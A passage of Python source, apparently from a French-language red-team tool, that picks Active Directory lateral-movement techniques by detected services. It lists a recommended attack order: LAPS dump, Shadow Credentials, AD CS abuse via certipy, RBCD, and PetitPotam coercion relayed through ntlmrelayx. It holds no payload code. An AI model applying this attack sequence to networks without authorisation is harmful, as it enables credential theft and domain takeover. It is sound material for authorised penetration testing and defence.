    techniques: list[LateralTechnique] = []
    notes: list[str] = []

    # DCOM et WMI — toujours pertinents sur Windows
    techniques += DCOM_TECHNIQUES + WMI_TECHNIQUES

    # MSSQL — si port 1433 détecté
    if mssql_detected:
        techniques += MSSQL_TECHNIQUES
        notes.append("MSSQL détecté (1433) → tester les linked servers en priorité")
    else:
        notes.append("MSSQL non détecté — si vous trouvez un MSSQL interne, tester les linked servers")

    # LAPS — toujours tenter si domaine présent
    techniques += LAPS_TECHNIQUES

    # Délégation + coercition + AD CS + Shadow Creds — si DC détecté
    if dc_detected:
        techniques += DELEGATION_TECHNIQUES + COERCION_TECHNIQUES + ADCS_TECHNIQUES + SHADOW_TECHNIQUES
        notes.append("DC détecté (Kerberos:88 + LDAP:389) → délégation, AD CS, Shadow Creds disponibles")
    else:
        notes.append("DC non détecté dans le scan — si AD en présence, relancer avec --target DC_IP")

    # RDP hijacking — si RDP ouvert
    if rdp_detected:
        techniques += RDP_TECHNIQUES
        notes.append("RDP détecté (3389) → session hijacking possible depuis SYSTEM")

    notes += [
        "Ordre d'attaque recommandé :",
        "  1. LAPS dump (si GenericRead sur ms-Mcs-AdmPwd)",
        "  2. Shadow Credentials (si GenericWrite sur un compte)",
        "  3. AD CS (certipy find -vulnerable → ESC1/ESC8)",
        "  4. RBCD (si GenericWrite sur un computer account)",
        "  5. Coercition + relay (PetitPotam → ntlmrelayx → AD CS)",
        "Toujours vérifier les chemins dans BloodHound avant d'exploiter.",
    ]

    return LateralResult(
        target=target,
        domain=domain or "DOMAIN",
        dc_detected=dc_detected,
        mssql_detected=mssql_detected,
        rdp_detected=rdp_detected,
        techniques=techniques,
        notes=notes,
    )


def get_all_lateral_techniques() -> list[LateralTechnique]:
    """Retourne toutes les techniques sans filtrage contextuel."""
    return (
        DCOM_TECHNIQUES + WMI_TECHNIQUES + MSSQL_TECHNIQUES +
        LAPS_TECHNIQUES + DELEGATION_TECHNIQUES + COERCION_TECHNIQUES +
        ADCS_TECHNIQUES + SHADOW_TECHNIQUES + RDP_TECHNIQUES
    )
